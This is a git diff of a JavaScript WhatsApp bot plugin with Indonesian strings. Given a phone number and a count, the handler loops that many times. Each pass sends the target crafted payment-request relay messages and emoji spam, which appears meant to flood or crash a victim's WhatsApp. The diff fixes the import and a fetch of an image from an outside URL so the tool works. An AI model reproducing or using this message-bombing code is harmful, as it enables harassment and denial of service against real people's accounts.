@@ -1,5 +1,6 @@
 
-import fetch from 'node-'
+import fetch from 'node-fetch'
+
 let handler = async (m, { conn, text, command }) => {
 if (!text) throw `*Jangan disalahgunakan yh*\n\nExample: ${command} 628XXXXXX/10`
 let num = text.split('/')[0]+"@s.whatsapp.net"
@@ -23,9 +24,9 @@ participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})
 }}}
 for (let i = 0; i < jumlah; i++) {
   
-let gmbr = await fetch
+let gmbr = await fetch('https://genix.eu.org/akebi.jpg')
     
-conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.thumb }}}}, {})
+conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: gmbr }}}}, {})
 
 conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
 }
